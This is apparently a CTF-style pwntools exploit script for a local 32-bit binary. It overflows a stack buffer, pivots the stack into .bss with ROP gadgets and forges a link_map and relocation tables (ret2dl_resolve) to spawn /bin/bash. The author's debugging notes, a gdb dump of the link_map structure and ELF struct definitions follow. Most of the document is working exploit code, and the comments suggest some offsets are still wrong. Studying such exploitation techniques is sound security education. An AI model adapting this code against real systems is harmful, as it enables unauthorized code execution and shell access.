from pwn import *

binary_name = "./tmp/binary1"
libc = ELF("./libc.so.6")
context.arch = 'i386'

inputs = [b'ex4722', b'What do you mean? African or European swallow?\x00', b'ex4722']
exe = ELF(binary_name)
rop = ROP(binary_name)

gdbscript = r"""
set $link = *0x804b004
define ld_load
    x/2x $esp
    set $stack = $esp + 4
    set $i =  *((char **) ($stack))
    printf "AT %p is %d\n", $stack, $i
    x/2wx 0x08048320 + $i 
    printf "R_info: %p\n", *( 0x08048320 + $i +4)
    set $rinfo = *(int)( 0x08048320 + $i +4)
    set $rsym = $rinfo >> 8 
    printf "R_sym: %p\n", $rsym 
    set $sym = 0x080481cc + 0x10 * $rsym
    printf "SYM : %p\n", $sym 
    x/6wx $sym
    printf "STR_OFF: %p\n", *$sym 
    set $sym =  *$sym 
    printf "Symbol: %s\n", $sym + 0x0804826c
end
c
"""


def new_processes():
    p = process(binary_name)
    for i in inputs:
        p.send(i)
    return p

def new_debug():
    p = gdb.debug(binary_name,gdbscript=gdbscript)
    for i in inputs:
        p.send(i)
    return p

bof_size = 38


p = new_processes()

dl_resolve_func = 0x8048380
leave_ret = 0x08048cab

leave_ret = rop.find_gadget(["leave","ret"]).address 
stack_gad = rop.find_gadget(["pop ebx","pop esi", "pop edi", "pop ebp"]).address
ret = rop.find_gadget(["ret"]).address


p = new_debug()
# Stack Piviot, read into fake stack, then jmp
fake_stack = exe.bss() + 0xd00
fake_stack2 = exe.bss() + 0xe00 
fake_link_map_addr = exe.bss() + 0x200 +8


payload = flat([ 
    b"A"*(bof_size),
    exe.plt.read,
    stack_gad,
    0, fake_stack, 0x400,
    # New EBP 
    fake_stack,
    # New RIP,pivot now
    leave_ret,
    ])

p.send(payload)
sleep(.5)


jmprel = 0x08048320
symtab  = 0x080481cc
strtab  = 0x0804826c


jmp_offset = 0x1337

# fake_str = b"execve\x00\x00/bin/bash"

offset_2_addr = libc.symbols.system - libc.symbols.__libc_start_main
known_pointer = exe.got.__libc_start_main


def make_link_map(fake_addr, reloc_index, offset_2_addr, got_start_addr):
    map_size =  484

    fake_link_map =  flat([ 
        {0: (offset_2_addr) },
        {0x38 - 4: fake_addr + 128 },
        ], length = 0x80, word_size = 32, endianness ="little")


    fake_link_map = b'' 
    fake_link_map += p32(0)

    fake_link_map += fake_link_map.ljust(0x30, b'\x00') 

    # *strtab, pointer to pointer of strtab
    fake_link_map += p32(fake_addr + map_size) 

    # *symtab, pointer to pointer of symtab
    fake_link_map += p32(fake_addr + map_size+ 8 ) 

    fake_link_map = fake_link_map.ljust(124, b'\x00') 

    # *jmptab, pointer to pointer of jmptab
    fake_link_map += p32(fake_addr + map_size+ 8 + 8) 

    fake_link_map = fake_link_map.ljust(0x01e0, b'\x00') 
    fake_link_map += p32(exe.bss()) 

    return fake_link_map 

fake = make_link_map(fake_link_map_addr, 0, offset_2_addr, exe.got.__libc_start_main)

# Pointer points here, this points to strtab, tag for strtab
fake += p32(5)
fake += p32(fake_link_map_addr + 128  + 3 * 8 - 48)

# Pointer points here, this points to symtab , tag for symtab
fake += p32(6)
fake += p32(symtab)

# Pointer points here, this points to jmprel
fake += p32(17)
fake += p32(jmprel-1)

fake += b'execve\x00\x00/bin/bash\x00' 



# Read in fake tables 
payload = flat([ 
    0xbeefbeef,
    exe.plt.read,
    stack_gad,
    0, fake_link_map_addr, 0x400,

    # New EBP, to instruction after lev_ret
    fake_stack + (7*4),
    # New RIP,pivot again to next instructin
    leave_ret,
    dl_resolve_func + 6,
    # LINK MAP
    fake_link_map_addr,
    # First entry of jmprel
    1,
    # execve ret addr
    0xdeadbeef,
    fake_link_map_addr + fake.index(b"/bin/bash"),
    0,0
    ])
p.send(payload)

# Send fake link_map
sleep(.5)
input("BREAK")
p.send(fake)




"""
How to ret 2 dl_resolve:
push val1
dl_runtime_resolve()
val1 + jumprel -(ONE ENTRY???) == Elf32_Rel  *reloc_table
    *reloc_table  = got addr
    *reloc_table +4 = r_info 
        ELF32_R_SYM == r_info >>8 
        ELF32_R_TYPE == r_info & 0xff ( 7 for GOT??)

func's symtab == symtab + ELF32_R_SYM * 0x10

name = STRTAB + func's symtab(First entry)


elf_machine_fixup_plt()
Writes result to got addr specificed


jmp_offset correct 
symtab_offset
strOffset WRONG

Messup upp ofset??
Strtab + 0 for some reason
adds it here _dl_fixup+228

Checking offset 
    _dl_fixup+120
"""


"""
dt link_map 
link_map
    +0x0000 l_addr               : Elf32_Addr
    +0x0004 l_name               : char *
    +0x0008 l_ld                 : Elf32_Dyn *
    +0x000c l_next               : link_map *
    +0x0010 l_prev               : link_map *
    +0x0014 l_real               : link_map *
    +0x0018 l_ns                 : Lmid_t
    +0x001c l_libname            : libname_list *
    +0x0020 l_info               : Elf32_Dyn *[77]
    +0x0154 l_phdr               : const Elf32_Phdr *
    +0x0158 l_entry              : Elf32_Addr
    +0x015c l_phnum              : Elf32_Half
    +0x015e l_ldnum              : Elf32_Half
    +0x0160 l_searchlist         : r_scope_elem
    +0x0168 l_symbolic_searchlist : r_scope_elem
    +0x0170 l_loader             : link_map *
    +0x0174 l_versions           : r_found_version *
    +0x0178 l_nversions          : unsigned int
    +0x017c l_nbuckets           : Elf_Symndx
    +0x0180 l_gnu_bitmask_idxbits : Elf32_Word
    +0x0184 l_gnu_shift          : Elf32_Word
    +0x0188 l_gnu_bitmask        : const Elf32_Addr *
    +0x018c                      : union {...}
    +0x0190                      : union {...}
    +0x0194 l_direct_opencount   : unsigned int
    +0x0198 l_type               : enum {...}
    +0x0198.2 l_relocated          : unsigned int
    +0x0198.3 l_init_called        : unsigned int
    +0x0198.4 l_global             : unsigned int
    +0x0198.5 l_reserved           : unsigned int
    +0x0198.7 l_main_map           : unsigned int
    +0x0199 l_visited            : unsigned int
    +0x0199.1 l_map_used           : unsigned int
    +0x0199.2 l_map_done           : unsigned int
    +0x0199.3 l_phdr_allocated     : unsigned int
    +0x0199.4 l_soname_added       : unsigned int
    +0x0199.5 l_faked              : unsigned int
    +0x0199.6 l_need_tls_init      : unsigned int
    +0x0199.7 l_auditing           : unsigned int
    +0x019a l_audit_any_plt      : unsigned int
    +0x019a.1 l_removed            : unsigned int
    +0x019a.2 l_contiguous         : unsigned int
    +0x019a.3 l_symbolic_in_local_scope : unsigned int
    +0x019a.4 l_free_initfini      : unsigned int
    +0x019a.5 l_ld_readonly        : unsigned int
    +0x019a.6 l_find_object_processed : unsigned int
    +0x019b l_nodelete_active    : _Bool
    +0x019c l_nodelete_pending   : _Bool
    +0x019d l_property           : enum {...}
    +0x01a0 l_x86_feature_1_and  : unsigned int
    +0x01a4 l_x86_isa_1_needed   : unsigned int
    +0x01a8 l_1_needed           : unsigned int
    +0x01ac l_rpath_dirs         : r_search_path_struct
    +0x01b4 l_reloc_result       : reloc_result *
    +0x01b8 l_versyms            : Elf32_Versym *
    +0x01bc l_origin             : const char *
    +0x01c0 l_map_start          : Elf32_Addr
    +0x01c4 l_map_end            : Elf32_Addr
    +0x01c8 l_text_end           : Elf32_Addr
    +0x01cc l_scope_mem          : r_scope_elem *[4]
    +0x01dc l_scope_max          : size_t
    +0x01e0 l_scope              : r_scope_elem **
    +0x01e4 l_local_scope        : r_scope_elem *[2]
    +0x01ec l_file_id            : r_file_id
    +0x01fc l_runpath_dirs       : r_search_path_struct
    +0x0204 l_initfini           : link_map **
    +0x0208 l_reldeps            : link_map_reldeps *
    +0x020c l_reldepsmax         : unsigned int
    +0x0210 l_used               : unsigned int
    +0x0214 l_feature_1          : Elf32_Word
    +0x0218 l_flags_1            : Elf32_Word
    +0x021c l_flags              : Elf32_Word
    +0x0220 l_idx                : int
    +0x0224 l_mach               : link_map_machine
    +0x0230 l_lookup_cache       : struct {...}
    +0x0240 l_tls_initimage      : void *
    +0x0244 l_tls_initimage_size : size_t
    +0x0248 l_tls_blocksize      : size_t
    +0x024c l_tls_align          : size_t
    +0x0250 l_tls_firstbyte_offset : size_t
    +0x0254 l_tls_offset         : ptrdiff_t
    +0x0258 l_tls_modid          : size_t
    +0x025c l_tls_dtor_count     : size_t
    +0x0260 l_relro_addr         : Elf32_Addr
    +0x0264 l_relro_size         : size_t
    +0x0268 l_serial             : long long unsigned int
"""

'''  linkmap:  
    0x00: START  
    0x00: l_addr (offset from libc_address to target address  
    0x08:  
    0x10:  
    0x14:  
    0x15:  
    0x18:  
    0x20:  
    0x28: # target address here  
    0x30: fake_jmprel #r_offset  
    0x38: #r_info should be 7  
    0x40: #r_addend 0  0x48:  
    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)  
    0x70: p_DT_SYMTAB = fake_DT_SYMTAB  
    0xf8: p_DT_JMPREL = fake_DT_JMPREL  
    0x100: END  

typedef struct  {  Elf64_Word st_name; /* Symbol name (string tbl index) */  unsigned char st_info; /* Symbol type and binding */  unsigned char st_other; /* Symbol visibility */  Elf64_Section st_shndx; /* Section index */  Elf64_Addr st_value; /* Symbol value */  Elf64_Xword st_size; /* Symbol size */  } Elf64_Sym;  typedef struct  {  Elf64_Addr r_offset; /* Address */  Elf64_Xword r_info; /* Relocation type and symbol index */  Elf64_Sxword r_addend; /* Addend */  } Elf64_Rela;  
'''
